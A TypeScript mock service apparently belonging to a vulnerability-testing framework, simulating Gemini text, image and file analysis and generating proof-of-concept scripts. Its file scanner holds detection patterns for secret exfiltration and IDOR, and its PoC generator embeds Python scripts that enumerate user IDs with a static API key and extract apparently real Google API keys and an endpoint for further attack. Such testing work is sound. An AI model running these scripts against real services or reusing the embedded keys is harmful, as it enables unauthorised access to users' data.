// services/gemini.service.ts
import { apiClient } from './apiClient'; // apiClient might not be used if all is mock
import { 
    GeminiTextRequest, 
    GeminiTextResponse, 
    GeminiImageRequest, 
    GeminiImageResponse,
    GeminiFileAnalysisRequest,
    GeminiFileAnalysisResponse,
    GeminiPocGenRequest,
    GeminiPocGenResponse
} from '../types/apiTypes';
import { ApiResponse } from '../types';

const SIMULATED_GEMINI_DELAY = 1200; // ms
const SIMULATED_FILE_ANALYSIS_DELAY = 1800; //ms
const SIMULATED_POC_GEN_DELAY = 1500; //ms

export const geminiService = {
  simulateGeminiTextAnalysis: async (request: GeminiTextRequest): Promise<ApiResponse<GeminiTextResponse>> => {
    console.log('[GeminiService] Simulating Gemini text analysis for:', request.text.substring(0, 50) + "...");
    await new Promise(resolve => setTimeout(resolve, SIMULATED_GEMINI_DELAY));

    // Mock response generation
    const analysisTokens = request.text.toLowerCase().split(/\s+/);
    const sentiment = analysisTokens.includes('happy') ? 'Positive' : analysisTokens.includes('sad') ? 'Negative' : 'Neutral';
    const keywords = analysisTokens.filter(token => token.length > 4 && !['this', 'that', 'with', 'your'].includes(token)).slice(0, 5);

    const mockResponseData: GeminiTextResponse = {
      analyzedText: `Simulated analysis of: "${request.text}"`,
      insights: {
        wordCount: analysisTokens.length,
        sentiment: sentiment,
        dominantLanguage: "English (simulated)",
        keywords: keywords,
        mockConfidence: Math.random() * 0.3 + 0.7, // High confidence
        entities: [{ type: "PERSON", name: "Bard (simulated entity)" }]
      },
    };
    
    return { success: true, data: mockResponseData };
  },

  simulateGeminiImageGeneration: async (request: GeminiImageRequest): Promise<ApiResponse<GeminiImageResponse>> => {
    console.log('[GeminiService] Simulating Gemini image generation for prompt:', request.prompt);
    await new Promise(resolve => setTimeout(resolve, SIMULATED_GEMINI_DELAY + 500)); // Image gen takes longer

    // Mock image URL based on prompt
    const promptKeywords = request.prompt.toLowerCase().split(/\s+/).slice(0,3).join('_');
    const mockImageUrl = `https://picsum.photos/seed/${encodeURIComponent(promptKeywords)}/400/300`;

    const mockResponseData: GeminiImageResponse = {
      imageUrl: mockImageUrl,
      promptUsed: request.prompt,
    };

    return { success: true, data: mockResponseData };
  },

  simulateGeminiFileAnalysis: async (request: GeminiFileAnalysisRequest): Promise<ApiResponse<GeminiFileAnalysisResponse>> => {
    console.log(`[GeminiService] Simulating Gemini file analysis for: ${request.fileName}`);
    await new Promise(resolve => setTimeout(resolve, SIMULATED_FILE_ANALYSIS_DELAY));

    const findings: string[] = [];
    let summary = `Simulated AI analysis of '${request.fileName}' complete.`;
    const { fileName, fileContent } = request;

    // Generic checks
    if (fileContent.includes('TODO: FIX SECURITY ISSUE')) {
        findings.push("WARNING: Code contains 'TODO: FIX SECURITY ISSUE'. Indicates recognized but unresolved potential problem.");
    }
    if (fileContent.match(/password\s*=\s*['"].+['"]/i)) {
        findings.push("WARNING: Potential hardcoded password found (matched 'password = \"...\"'). Review immediately.");
    }

    // File-specific checks based on VTF context
    if (fileName.includes('gtm-loader.js')) {
        if (fileContent.includes('window.WIZ_global_data') && (fileContent.includes('PeqOqb') || fileContent.includes('S06Grb'))) {
            findings.push("CRITICAL (VTF Context): Script accesses 'window.WIZ_global_data' for 'PeqOqb' (API Key) or 'S06Grb' (User ID). High risk of client-side secret exfiltration if this script sends data externally.");
        }
        if (fileContent.includes('navigator.sendBeacon') || fileContent.includes('fetch(') || fileContent.includes('XMLHttpRequest')) {
            findings.push("INFO (VTF Context): Script uses network request methods (sendBeacon, fetch, XMLHttpRequest). If combined with sensitive data access, this could be an exfiltration vector. Verify data sent.");
        }
        summary = `Analysis of '${fileName}' (GTM simulation) suggests potential for client-side secret access and exfiltration if data is sent to an external endpoint.`;
    } else if (fileName.includes('server.js') && fileName.includes('api')) { // Assuming services/api/server.js
        if (fileContent.includes('USER_PROMPTS_DB[requestedUserId]') && fileContent.includes("app.get('/_/MakerSuite/v1/users/:userId/prompts'")) {
            if (!fileContent.includes('someSecureAuthorizationCheck(req.user, requestedUserId)')) { // Example of a missing secure check
                 findings.push("CRITICAL (VTF Context): Endpoint '/_/MakerSuite/v1/users/:userId/prompts' appears to access 'USER_PROMPTS_DB' using 'requestedUserId' from path. If authorization based on the authenticated user's rights to access 'requestedUserId' data is missing after API key check, this is an IDOR vulnerability.");
            }
        }
        if (fileContent.includes('AIzaSyBMkT3C6wEWAJmpaF6WXKs1W9CThdaYuq8')) {
            findings.push("WARNING (VTF Context): Hardcoded static API key 'AIzaSyBMkT3C6wEWAJmpaF6WXKs1W9CThdaYuq8' found in server-side code. This key should be an environment variable and managed securely.");
        }
        if (fileContent.match(/const USER_PROMPTS_DB = {[^}]*"sk-live-[a-zA-Z0-9]+"/)) {
            findings.push("WARNING (VTF Context): Mock database 'USER_PROMPTS_DB' seems to contain hardcoded secrets (e.g., 'sk-live-...'). Sensitive data should not be hardcoded even in mock databases if they reflect real structures.");
        }
        summary = `Analysis of '${fileName}' (API server simulation) indicates high risk of IDOR and potential hardcoded credentials/secrets.`;
    } else if (fileName.includes('index.html')) {
        if (fileContent.includes('window.WIZ_global_data') && fileContent.includes('PeqOqb')) {
            findings.push("CRITICAL (VTF Context): 'window.WIZ_global_data.PeqOqb' (Static API Key) found directly in HTML. This is a severe client-side secret exposure.");
        }
        if (fileContent.includes('S06Grb') && fileContent.includes('window.WIZ_global_data')) {
            findings.push("WARNING (VTF Context): 'window.WIZ_global_data.S06Grb' (User ID) found in HTML. Client-side User ID exposure can facilitate IDOR if other vulnerabilities exist.");
        }
        summary = `Analysis of '${fileName}' indicates client-side exposure of sensitive global data, including API keys and User IDs.`;
    } else {
        findings.push("INFO: No VTF-specific critical vulnerability patterns detected in this simplified simulation for this file type.");
        summary = `Generic analysis of '${fileName}' complete. Review manually for application-specific logic.`;
    }

    if (findings.length === 0) {
        findings.push("INFO: No specific pre-defined VTF vulnerability patterns or common hardcoded secret patterns found by this simulation.");
    }

    return { success: true, data: { findings, summary, fileName } };
  },

  simulateGeminiPocGeneration: async (request: GeminiPocGenRequest): Promise<ApiResponse<GeminiPocGenResponse>> => {
    console.log(`[GeminiService] Simulating Gemini PoC generation for: ${request.vulnerabilityType}`);
    await new Promise(resolve => setTimeout(resolve, SIMULATED_POC_GEN_DELAY));

    let generatedPocScript = "# Placeholder PoC script";
    let description = "Conceptual PoC script.";
    let executionHints = "Replace placeholders and run in a Python environment.";

    if (request.vulnerabilityType === 'idor-local') {
      description = "This Python script attempts to exploit an IDOR vulnerability on the local VTF test server (`services/api/server.js`). It uses the known static API key and iterates through a list of potential victim User IDs to access their prompts. This demonstrates how an attacker might 'brute force' or enumerate User IDs to find vulnerable accounts.";
      executionHints = "Save this as a .py file. Ensure the 'requests' library is installed (`pip install requests`). Start the local vulnerable server (e.g., `cd services/api && npm install && npm start`). Then execute this Python script. You can modify the `victim_ids_to_try` list to test other IDs present in `services/api/server.js`.";
      generatedPocScript = `
import requests
import json

# Static API Key as found in WIZ_global_data.PeqOqb
# This key is used by the local vulnerable server for 'authentication'.
STATIC_API_KEY = "AIzaSyBMkT3C6wEWAJmpaF6WXKs1W9CThdaYuq8"

# Target URL for the local vulnerable server (defaulting to port 3001)
# Make sure your services/api/server.js is running on this port.
BASE_URL = "${request.targetUrl || 'http://localhost:3001'}/_/MakerSuite/v1/users"

# User IDs to attempt to access.
# These are taken from the mock database in services/api/server.js
# For a 'brute force' concept, this list would be much larger or systematically generated.
victim_ids_to_try = [
    "112185183313702653438", # Victim ID from server.js mock data
    "admin_vulnerable_001",  # Another victim ID from server.js mock data
    "MOCK_USER_ID_112233445566778899", # Attacker's own ID (should be accessible)
    "000000000000000000000", # A likely non-existent ID (should result in 404)
    # Add more IDs here to simulate brute-forcing
]

headers = {
    "X-Goog-Api-Key": STATIC_API_KEY,
    "Accept": "application/json",
    "User-Agent": "VTF-AI-PoC-Generator/1.0 (IDOR Test)"
}

print(f"Attempting IDOR on {BASE_URL} using API Key: {STATIC_API_KEY[:10]}...")
print("---")

for user_id in victim_ids_to_try:
    target_url = f"{BASE_URL}/{user_id}/prompts"
    print(f"[*] Testing User ID: {user_id}")
    print(f"    Requesting URL: {target_url}")
    
    try:
        response = requests.get(target_url, headers=headers, timeout=5)
        print(f"    Status Code: {response.status_code}")
        
        if response.status_code == 200:
            try:
                data = response.json()
                print(f"    SUCCESS: Data exfiltrated!")
                print(f"      Content (first 100 chars of JSON): {json.dumps(data)[:100]}...")
                # In a real brute-force, you might save this data or stop upon first success.
            except json.JSONDecodeError:
                print(f"    WARNING: Status 200 but non-JSON response: {response.text[:100]}...")
        elif response.status_code == 404:
            print(f"    INFO: User ID not found (404). This is expected for non-existent IDs.")
        elif response.status_code == 401:
            print(f"    ERROR: Authentication failed (401). API Key might be wrong or server not configured as expected.")
        elif response.status_code == 403:
             print(f"    INFO: Access Forbidden (403). This might indicate the IDOR is fixed for this user/endpoint or other permission issues.")
        else:
            print(f"    INFO: Received status {response.status_code}. Response: {response.text[:100]}...")
    
    except requests.exceptions.RequestException as e:
        print(f"    ERROR: Request failed - {e}")
        print(f"           Ensure the local server (services/api/server.js) is running on the correct port.")
    print("---")

print("IDOR attempt simulation finished.")
`;
    } else if (request.vulnerabilityType === 'client-secret-extraction') {
      description = "This Python script simulates extracting secrets (API Key, User ID) from a JSON string. This string represents the `window.WIZ_global_data` object found in the VTF's `index.html`. It demonstrates programmatically accessing these exposed client-side values.";
      executionHints = "Save as a .py file. The `mock_wiz_data_json` variable contains the data structure. In a real scenario, you would populate this string by copying `JSON.stringify(window.WIZ_global_data)` from the browser's developer console on the target page. Then, run the Python script.";
      generatedPocScript = `
import json

# Simulate the content of window.WIZ_global_data as a JSON string.
# In a real scenario, you'd paste the copied content from an actual page here.
mock_wiz_data_json = """
{
  "PeqOqb": "AIzaSyBMkT3C6wEWAJmpaF6WXKs1W9CThdaYuq8", 
  "WIu0Nc": "AIzaSyDdP816MREB3SkjZO04QXbjsigfcI0GWOs", 
  "S06Grb": "MOCK_USER_ID_112233445566778899",
  "oPEP7c": "mockuser@example.com",            
  "CoJqbf": "https://alkalimakersuite-pa.clients6.google.com",
  "EBvNTe": "823511539352-ojaretejk1s95sdvkic0te923pt7knpu.apps.googleusercontent.com",
  "W3Yyqf": "MOCK_USER_ID_112233445566778899" 
}
"""

print("Attempting to extract secrets from mock WIZ_global_data string...")
print("---")

try:
    wiz_data = json.loads(mock_wiz_data_json)
    
    api_key_peqoqb = wiz_data.get("PeqOqb")
    api_key_wiu0nc = wiz_data.get("WIu0Nc")
    user_id_s06grb = wiz_data.get("S06Grb")
    email_opep7c = wiz_data.get("oPEP7c")
    endpoint_cojqbf = wiz_data.get("CoJqbf")

    if api_key_peqoqb:
        print(f"SUCCESS: Found Static API Key (PeqOqb): {api_key_peqoqb}")
    else:
        print("INFO: Static API Key (PeqOqb) not found.")

    if api_key_wiu0nc:
        print(f"SUCCESS: Found Static API Key (WIu0Nc): {api_key_wiu0nc}")
    else:
        print("INFO: Static API Key (WIu0Nc) not found.")

    if user_id_s06grb:
        print(f"SUCCESS: Found User ID (S06Grb): {user_id_s06grb}")
    else:
        print("INFO: User ID (S06Grb) not found.")
    
    if email_opep7c:
        print(f"INFO: Found Email (oPEP7c - PII): {email_opep7c}")
    
    if endpoint_cojqbf:
         print(f"INFO: Found API Endpoint (CoJqbf): {endpoint_cojqbf}")

    if api_key_peqoqb and user_id_s06grb and endpoint_cojqbf:
        print("\\n---")
        print("CONCEPTUAL NEXT STEP: Use these extracted values to attempt an IDOR:")
        print(f"Target URL Example: {endpoint_cojqbf}/_/MakerSuite/v1/users/{user_id_s06grb}/prompts")
        print(f"With Header: X-Goog-Api-Key: {api_key_peqoqb}")
        print("This demonstrates how client-side secret exposure directly enables further attacks.")

except json.JSONDecodeError as e:
    print(f"ERROR: Could not parse WIZ_global_data JSON - {e}")
except Exception as e:
    print(f"ERROR: An unexpected error occurred during extraction - {e}")

print("---")
print("Client-side secret extraction simulation finished.")
`;
    }
    
    return { 
        success: true, 
        data: { 
            generatedPocScript, 
            description, 
            executionHints,
            vulnerabilityType: request.vulnerabilityType
        } 
    };
  },
};